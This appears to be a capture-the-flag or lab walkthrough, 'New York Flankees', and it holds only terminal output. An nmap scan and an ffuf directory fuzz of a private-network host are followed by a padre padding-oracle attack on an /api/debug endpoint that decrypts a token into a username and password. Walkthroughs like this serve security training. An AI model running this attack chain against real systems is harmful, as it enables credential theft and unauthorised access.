# New York Flankees

```
$ nmap -sV -Pn 10.64.132.243
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 05:13 -0500
Nmap scan report for 10.64.132.243
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Octoshape P2P streaming web service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
```

```
$ ffuf -u http://10.64.132.243:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.64.132.243:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 4332, Words: 1192, Lines: 123, Duration: 134ms]
favicon.ico             [Status: 200, Size: 6538, Words: 371, Lines: 76, Duration: 133ms]
login.html              [Status: 200, Size: 2670, Words: 824, Lines: 88, Duration: 134ms]
.                       [Status: 200, Size: 4332, Words: 1192, Lines: 123, Duration: 135ms]
debug.html              [Status: 200, Size: 2638, Words: 792, Lines: 84, Duration: 134ms]
:: Progress: [17129/17129] :: Job [1/1] :: 275 req/sec :: Duration: [0:00:57] :: Errors: 0 ::
```



```
$ ./padre-linux-amd64 -u 'http://10.64.132.243:8080/api/debug/$' -e lhex -err "Decryption error" '39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4'
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] padding oracle confirmed
[+] detected block length: 16
[!] mode: decrypt
[1/1] stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f
```